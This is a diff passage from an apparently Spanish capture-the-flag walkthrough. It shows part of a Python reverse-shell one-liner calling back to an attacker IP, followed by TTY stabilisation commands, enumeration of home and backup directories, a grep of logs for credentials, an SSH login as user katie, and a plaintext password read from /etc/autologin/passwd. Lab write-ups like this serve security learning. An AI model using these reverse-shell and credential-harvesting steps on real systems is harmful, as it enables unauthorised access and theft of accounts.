@@ -76,6 +76,40 @@ socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec
 10.14.3",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
 os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
+Nos conectamos y conseguimos una buena shell
+
+```
+# In the reverse shell
+SHELL=/bin/bash script -q /dev/null
+Ctrl-Z
+# In Parrot
+stty raw -echo
+fg
+reset
+xterm
+# In the reverse shell
+export SHELL=bash
+export TERM=xterm-256color
+stty rows 24 columns 150
+```
+
+Si hacemos una enumeracion por /home/user/ podemos encontrar archivos de usuarios y hashes también tneemos backups dentro de /backups/user_profiles que pueden leer los usuarios
+
+Vamos a hacer enumeraciones de servicio como ftp 
+```
+grep -R ftp://
+```
+
+encontramos un 00089.log y le hacemos cat, encontramos una contraseña del usuario katie
+```
+ssh katie@ip
+```
+Tambien tenemos otro archivo que nos dice literalmente la pass en la ruta /etc/autologin/passwd
+
+```
+SummerHereWeCome!!
+```
+
 
 
 
